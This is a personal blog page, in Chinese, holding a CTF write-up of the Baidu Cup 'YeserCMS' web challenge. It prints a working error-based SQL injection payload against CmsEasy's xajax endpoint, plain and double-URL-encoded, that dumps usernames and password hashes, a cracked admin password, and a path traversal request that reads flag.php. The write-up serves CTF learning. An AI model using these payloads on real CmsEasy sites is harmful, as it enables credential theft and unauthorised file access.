@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="“百度杯”CTF比赛 九月场web YeserCMS 题目提示：CMS系统，漏洞，flag在flag.php中 没有思路，查看wp，一步步做出来。 这个系统有很多漏洞，不知道用哪个。 在网址的一个评论框里，有个cmseasy字样，搜索有关漏洞，发现有一个/celive/live/header.php下存在报错注入。 搜索cmseasy公开漏洞，可以查到许多通用漏洞。...">
+        <meta name="keywords" content="sql">
+        <link rel="icon" href="/favicon.ico">
+
+        <title>“百度杯”CTF比赛 九月场web YeserCMS - Czj's 博客</title>
+
+        <!-- Stylesheets -->
+        <link href="/theme/css/all.min.css" rel="stylesheet">
+        <!-- /Stylesheets -->
+
+        <!-- RSS Feeds -->
+        <!-- /RSS Feeds -->
+
+        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+
+
+    </head>
+
+    <body>
+
+        <!-- Header -->
+    <div class="header-container" style="background: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)), url('/images/abc.jpg'); background-position: center; background-size: cover;">
+
+            <!-- Static navbar -->
+            <div class="container">
+                <div class="header-nav">
+                    <div class="header-logo">
+                        <a class="pull-left" href="/">MyBlog</a>
+                    </div>
+                    <div class="nav pull-right">
+                                <a href="/">首页</a>
+                                <a href="/categories.html">分类</a>
+                                <a href="/tags.html">标签</a>
+                    </div>
+                </div>
+            </div>
+            <!-- /Static navbar -->
+
+            <!-- Header -->
+    <!-- Header -->
+    <div class="container header-wrapper">
+        <div class="row">
+              <div class="col-lg-12">
+                  <div class="header-content">
+                      <h1 class="header-title">“百度杯”CTF比赛 九月场web YeserCMS</h1>
+                      <p class="header-date">By <a href="/author/czj.html">Czj</a>, 2019-10-15, 分类:  <a href="/category/icqctf.html">Icqctf</a></p>
+                      <div class="header-underline"></div>
+                      <div class="clearfix"></div>
+                      <p class="pull-right header-tags">
+                          <span class="glyphicon glyphicon-tags mr5" aria-hidden="true"></span>
+<a href="/tag/sql.html">sql</a>                      </p>
+                  </div>
+              </div>
+        </div>
+    </div>
+    <!-- /Header -->
+            <!-- /Header -->
+
+        </div>
+        <!-- /Header -->
+
+
+        <!-- Content -->
+    <div class="container content">
+        <h1>“百度杯”CTF比赛 九月场web YeserCMS</h1>
+<p>题目提示：CMS系统，漏洞，flag在flag.php中</p>
+<p>没有思路，查看wp，一步步做出来。</p>
+<p>这个系统有很多漏洞，不知道用哪个。</p>
+<p>在网址的一个评论框里，有个cmseasy字样，搜索有关漏洞，发现有一个/celive/live/header.php下存在报错注入。</p>
+<p><strong>搜索cmseasy公开漏洞，可以查到许多通用漏洞</strong>。
+https://www.seebug.org/appdir/CmsEasy
+使用无限制报错注入
+https://www.seebug.org/vuldb/ssvid-94084</p>
+<p>post的数据为：</p>
+<p><code>xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,substring((SELECT/**/GROUP_CONCAT(username,password) from yesercms_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;</code></p>
+<p>得到的md5值不全，修改1，32为7，40，得到全部md5值</p>
+<p><img alt="image-20191015010611576" src="/Users/cyh/virtualenvs/pelican/content/images/image-20191015010611576.png"></p>
+<p><img alt="image-20191015010700305" src="/Users/cyh/virtualenvs/pelican/content/images/image-20191015010700305.png"></p>
+<p>则：用户名 admin   md5:ff512d4240cbbdeafada404677ccbe61，解密为：Yeser231</p>
+<p>登陆后在编辑模块的地方发现可以查看html文件的地方，抓包分析，是一个post请求，id的参数是个文件名，修改为id=#../../flag.php，得到flag</p>
+<p><a href="https://www.jianshu.com/p/5713d699a14b">为什么url要编码</a></p>
+<p>替换为detail参数的部分用urlencode编码2次的数据（<strong>只用编码detail参数，xajax=Postdata&amp;xajaxargs[0]=和不变</strong>），即<code>xajax=Postdata&amp;xajaxargs[0]=detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Csubstring%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528username%252Cpassword%2529%2520from%2520yesercms_user%2529%252C1%252C32%2529%252C0x5d%2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529--%2520</code></p>
+
+
+        
+    </div>
+        <!-- /Content --> 
+
+        <!-- Footer -->
+        <div class="footer gradient-2">
+            <div class="container footer-container ">
+                <div class="row">
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Sitemap</div>
+                        <ul class="list-unstyled">
+                            <li><a href="/archives.html">Archives</a></li>
+                            <li><a href="/tags.html">Tags</a></li>
+                            <li><a href="/authors.html">Authors</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Social</div>
+                        <ul class="list-unstyled">
+                            <li><a href="#" target="_blank">You can add links in your config file</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Links</div>
+                        <ul class="list-unstyled">
+                            <li><a href="http://getpelican.com/" target="_blank">Pelican</a></li>
+                            <li><a href="http://python.org/" target="_blank">Python.org</a></li>
+                            <li><a href="http://jinja.pocoo.org/" target="_blank">Jinja2</a></li>
+                        </ul>
+                    </div> 
+                    <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3">
+                        <p class="pull-right text-right">
+                            <small><em>Proudly powered by <a href="http://docs.getpelican.com/" target="_blank">pelican</a></em></small><br/>
+                            <small><em>Theme and code by <a href="https://github.com/molivier" target="_blank">molivier</a></em></small><br/>
+                            <small>&copy; blogname 2015</small>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- /Footer -->
+    </body>
+</html>
